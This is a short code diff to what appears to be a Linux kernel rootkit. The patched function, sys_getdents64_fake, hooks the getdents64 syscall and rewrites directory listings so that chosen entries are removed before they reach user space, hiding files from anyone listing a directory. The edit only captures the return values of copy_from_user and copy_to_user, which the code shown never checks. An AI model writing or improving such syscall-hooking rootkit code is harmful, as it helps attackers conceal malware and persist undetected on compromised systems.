@@ -20,6 +20,7 @@ asmlinkage long sys_getdents64_fake(const struct pt_regs *regs)
     unsigned long setback = 0;
     unsigned long pos;
     long len;
+    unsigned long ret;
 
     len = call_original_syscall(__NR_getdents64, regs);
 
@@ -28,7 +29,7 @@ asmlinkage long sys_getdents64_fake(const struct pt_regs *regs)
 
     buffer = kmalloc(len, GFP_KERNEL);
 
-    copy_from_user(buffer, dirent, len);
+    ret = copy_from_user(buffer, dirent, len);
 
     for (pos = 0; pos < len; pos += curr_len)
     {
@@ -43,7 +44,7 @@ asmlinkage long sys_getdents64_fake(const struct pt_regs *regs)
 
     memset(buffer + len - setback, 0, setback);
 
-    copy_to_user(dirent, buffer, len);
+    ret = copy_to_user(dirent, buffer, len);
 
     kfree(buffer);
 
